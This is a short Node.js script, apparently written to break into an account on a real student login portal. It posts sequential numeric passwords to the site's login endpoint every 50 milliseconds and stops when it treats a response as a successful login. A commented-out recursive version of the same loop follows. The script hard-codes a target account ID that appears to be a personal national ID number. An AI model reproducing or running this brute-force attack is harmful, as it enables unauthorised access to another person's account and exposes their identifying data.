var request = require('request');
//requestAnimationFrame
function hack(pass, successCallback, failCallback) {
	request.post({
		//method: "post",
		url: "http://stu.1000phone.net/student.php/Public/login",
		formData: {
			"Account": "362524199301274017",
			"PassWord": pass
		}
	}, (err, res, body) => {
		if(body) {
			successCallback(pass);
			//console.log("失败", pass)
		} else {
			failCallback(pass);
			//console.log("成功", pass);
		}
		//console.log(body)
	})
}

let num = 273900;
let timer = setInterval(() => {
	hack(num, function(pass) {
		console.log("失败", pass)
	}, function(pass) {
		console.log("成功", pass);
		clearInterval(timer);
	});
	num++;
}, 50);
/*let num = 273700;

function hack() {
	num++;
	request.post({
		//method: "post",
		url: "http://stu.1000phone.net/student.php/Public/login",
		formData: {
			"Account": "362524199301274017",
			"PassWord": num
		}
	}, (err, res, body) => {
		if(body) {
			console.log("失败",num)
			hack();
		} else {
			console.log("成功",num)
			return;
		}
		//console.log(body)
	})
}
hack();*/